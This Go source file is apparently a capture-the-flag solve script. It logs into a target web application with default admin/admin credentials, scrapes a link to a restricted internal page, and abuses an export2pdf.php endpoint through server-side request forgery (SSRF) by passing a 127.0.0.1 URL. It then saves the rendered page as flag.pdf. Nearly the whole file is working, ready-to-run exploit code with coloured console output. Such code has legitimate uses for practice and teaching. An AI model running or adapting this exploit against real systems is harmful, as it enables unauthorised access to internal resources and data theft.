package main

import (
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
)

const EnableVirtualTerminalProcessing uint32 = 0x4

var ANSI_SET bool = false

var ANSI_CLRLN string = "\r\x1b[2K\r"
var ANSI_CLRSC string = "\x1b[2J\x1b[H"
var ANSI_RST string = "\x1b[0m"
var ANSI_RED string = "\x1b[31;1m"
var ANSI_GRN string = "\x1b[32;1m"
var ANSI_YLW string = "\x1b[33;1m"
var ANSI_BLU string = "\x1b[34;1m"

type Client struct {
	baseURL string
	Route   string
	Session *http.Client
	BaseIP  string
}

//
// Function Name: ConfigHeaders
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to setup the headers necessary
//  for a successful request to be made to the target.
//
// Input(s):
//
//  req - **http.Request. pointer to the request to be made.
//
// Return(s):
//
//  err - error. error if one is thrown, nil otherwise.
//
func (c *Client) ConfigHeaders(req **http.Request) (err error) {
	(*req).Header.Set("User-Agent", "Intruder")
	(*req).Header.Set("Content-Type", "application/x-www-form-urlencoded")
	(*req).Header.Set("Host", c.BaseIP)
	(*req).Header.Set("Origin", c.baseURL)
	return nil
}

// ============================================================
//
// Function Name: GetBodyContent
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take make a GET request to a target
//  route and return the body content to the user.
//
// Input(s):
//
//  route - string. route to make GET request on.
//
// Return(s):
//
//  bodycontent - []byte. content pulled from target URL.
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) GetBodyContent(route string) (bodycontent []byte, err error) {
	var targetURL string = fmt.Sprintf("%s/%s", c.baseURL, route)

	resp, err := c.Session.Get(targetURL)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	bodycontent, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return bodycontent, nil
}

//
// Function Name: GetFlag
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to conduct an SSRF attack against
//  the target and pull down a PDF file containing the
//  flag, which can be found in a restricted page.
//
// Input(s):
//
//  None
//
// Return(s):
//
//  err - error. error if one is thrown, nil otherwise.
//
func (c *Client) GetFlag() (err error) {
	var bodycontent []byte
	var data url.Values = url.Values{}
	var fptr *os.File
	var internalroute string
	var pattern string = `href=".*(internal/.*\.php)"`
	var req *http.Request
	var resp *http.Response
	var targetroute string = "export2pdf.php"
	var targeturl string = fmt.Sprintf("%s/%s", c.baseURL, targetroute)

	SysMsgNB("grabbing link to restricted resource ...")
	bodycontent, err = c.GetBodyContent("index.php")
	if err != nil {
		return err
	}

	internalroute, err = FindMatch(bodycontent, pattern)
	if err != nil {
		return err
	}

	internalroute = strings.Split(internalroute, "=")[1]
	internalroute = strings.ReplaceAll(internalroute, "\"", "")
	internalroute = strings.TrimLeft(internalroute, "/")

	SucMsg(fmt.Sprintf("restricted resource found: \"%s\"", internalroute))

	data.Set("url", fmt.Sprintf("http://127.0.0.1/%s", internalroute))

	SysMsgNB("creating SSRF request ...")
	req, err = http.NewRequest(http.MethodPost, targeturl, strings.NewReader(data.Encode()))
	if err != nil {
		return err
	}

	SysMsgNB("building headers ...")
	err = c.ConfigHeaders(&req)
	if err != nil {
		return err
	}

	//
	// conduct SSRF attack
	//
	resp, err = c.Session.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return errors.New(fmt.Sprintf("bad status code (%s)", resp.Status))
	}

	bodycontent, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	SysMsgNB("creating file ...")
	fptr, err = os.OpenFile("flag.pdf", os.O_WRONLY|os.O_APPEND|os.O_CREATE|os.O_TRUNC, 0644)
	if err != nil {
		return err
	}
	defer fptr.Close()

	SysMsgNB("writing content to file ...")
	_, err = fptr.Write(bodycontent)
	if err != nil {
		return err
	}

	return nil
}

//
// Function Name: InitCookie
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to grab a cookie from the login
//  page of the target. This seeds the other requests.
//
// Input(s):
//
//  None
//
// Return(s):
//
//  err - error. error if one is thrown, nil otherwise.
//
func (c *Client) InitCookie() (err error) {
	var resp *http.Response
	const targetroute string = "login.php"
	var targeturl string = fmt.Sprintf("%s/%s", c.baseURL, targetroute)

	resp, err = c.Session.Get(targeturl)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	c.Session.Jar.SetCookies(resp.Request.URL, resp.Cookies())

	return nil
}

//
// Function Name: Login
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to login to the site using given creds.
//
// Input(s):
//
//  uname - string. username to login with.
//  passwd - string. password for user.
//
// Return(s):
//
//  err - error. error if one is thrown, nil otherwise.
//
func (c *Client) Login(uname string, passwd string) (err error) {
	var data url.Values = url.Values{}
	var datastr string
	var req *http.Request
	var resp *http.Response
	const targetroute string = "verify.php"
	var targeturl string = fmt.Sprintf("%s/%s", c.baseURL, targetroute)

	err = c.InitCookie()
	if err != nil {
		return err
	}

	data.Set("username", uname)
	data.Set("password", passwd)

	datastr = data.Encode()

	req, err = http.NewRequest(http.MethodPost, targeturl, strings.NewReader(datastr))
	if err != nil {
		return err
	}

	c.Session.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}

	SysMsgNB("building headers ...")
	err = c.ConfigHeaders(&req)
	if err != nil {
		return err
	}
	req.Header.Set("Referer", fmt.Sprintf("%s/login.php", c.baseURL))

	resp, err = c.Session.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	c.Session.Jar.SetCookies(resp.Request.URL, resp.Cookies())

	if resp.StatusCode >= 400 {
		return errors.New(fmt.Sprintf("bad status code (%s)", resp.Status))
	}

	if resp.Header.Get("Location") != "/index.php" {
		return errors.New(fmt.Sprintf("login failed. (location: %s)", resp.Header.Get("location")))
	}

	c.Session.CheckRedirect = nil

	return nil
}

// ============================================================
//
// Function Name: Testconnection
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to test the connection to a target.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) TestConnection() (success bool, message string) {
	SysMsgNB(fmt.Sprintf("testing connection to \"%s\"", c.baseURL))

	resp, err := c.Session.Get(c.baseURL)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	return true, "client connection successful"
}

func SucMsg(msg string) {
	fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
	return
}

func ErrMsg(msg string) {
	fmt.Printf("%s[%s-%s] %s\n", ANSI_CLRLN, ANSI_RED, ANSI_RST, msg)
	return
}

func InfMsg(msg string) {
	fmt.Printf("%s[%si%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func InfMsgNB(msg string) {
	fmt.Printf("%s[%si%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func SysMsg(msg string) {
	fmt.Printf("%s[%s*%s] %s\n", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func SysMsgNB(msg string) {
	fmt.Printf("%s[%s*%s] %s", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func ValidatePort(portno int) (success bool, message string) {
	if (portno < 1) || (portno > 65535) {
		return false, "port must be between 1 and 65535"
	}
	return true, "port valid"
}

//============================================================
//
// Function Name: PrintCenter
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to print a message in the center of a
//  specified number of columns (n).
//
// Input(s):
//
//  msg - string. message to display.
//  n - int. total number of columns in row.
//
// Return(s):
//
//  None
//
//============================================================
func PrintCenter(msg string, n int) {
	var ansi_indent string = "\x1b%s"
	var indent_format string = "[%dC"
	var indent int

	fmt.Printf("%s", ANSI_CLRLN)
	if len(msg) > n {
		fmt.Printf("%s\n", msg)
		return
	}

	indent = (n - len(msg)) / 2
	indent_format = fmt.Sprintf(indent_format, indent)
	ansi_indent = fmt.Sprintf(ansi_indent, indent_format)

	fmt.Printf("%s%s%s%s\n", ansi_indent, ANSI_YLW, msg, ANSI_RST)

	return
}

func PrintChar(char byte, n int) {
	if n < 1 {
		return
	}

	for i := 0; i < n; i++ {
		fmt.Printf("%s%s%s", ANSI_RED, string(char), ANSI_RST)
	}
	fmt.Printf("\n")
}

//============================================================
//
// Function Name: FindMatch
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take a byte slice, search the slice
//  for a given regular expression pattern, and return the
//  first match of that pattern.
//
// Input(s):
//
//  bodycontent - []byte. byte slice to search for pattern.
//  tgtpattern - string. regex pattern to search for.
//
// Return(s):
//
//  match - string. first match of pattern discovered.
//  err - error. error if one is thrown, nil otherwise.
//
//============================================================
func FindMatch(bodycontent []byte, tgtpattern string) (match string, err error) {

	re, err := regexp.Compile(tgtpattern)
	if err != nil {
		return "", err
	}

	matches := re.FindAll(bodycontent, -1)

	if len(matches) < 1 {
		return "", errors.New("no matches found")
	}

	match = string(matches[0])

	return match, nil
}

func init() {
	return
}

func main() {
	var domain string
	var port int

	var baseURL string
	var scheme string

	var secure bool
	var err error

	var client Client = Client{Session: &http.Client{Timeout: 10 * time.Second}}

	var sessionjar *cookiejar.Jar

	sessionjar, err = cookiejar.New(nil)
	if err != nil {
		ErrMsg(err.Error())
		os.Exit(1)
	}

	client.Session.Jar = sessionjar

	flag.StringVar(&domain, "d", "127.0.0.1", "domain or ip address of target")
	flag.IntVar(&port, "p", 80, "port to communicate with target on")
	flag.BoolVar(&secure, "s", false, "use HTTPS instead of HTTP")
	flag.BoolVar(&secure, "secure", false, "use HTTPS instead of HTTP")
	flag.Parse()

	success, message := ValidatePort(port)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}

	PrintChar('=', 60)
	PrintCenter("Target Information", 60)
	PrintChar('=', 60)
	InfMsg(fmt.Sprintf("Target Domain: %s", domain))
	InfMsg(fmt.Sprintf("Target Port: %d", port))
	InfMsg(fmt.Sprintf("HTTPS: %v", secure))

	PrintChar('=', 60)

	//============================================================
	// HTTPS check.
	//============================================================
	if secure {
		scheme = "https"
	} else {
		scheme = "http"
	}
	baseURL = fmt.Sprintf("%s://%s:%d", scheme, domain, port)

	client.baseURL = baseURL
	client.BaseIP = domain

	//============================================================
	// Make sure the target is reachable.
	//============================================================
	success, message = client.TestConnection()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	err = client.Login("admin", "admin")
	if err != nil {
		ErrMsg(err.Error())
		os.Exit(1)
	}
	SucMsg("login success")

	err = client.GetFlag()
	if err != nil {
		ErrMsg(err.Error())
		os.Exit(1)
	}
	SucMsg("flag successfully pulled down")

	return
}

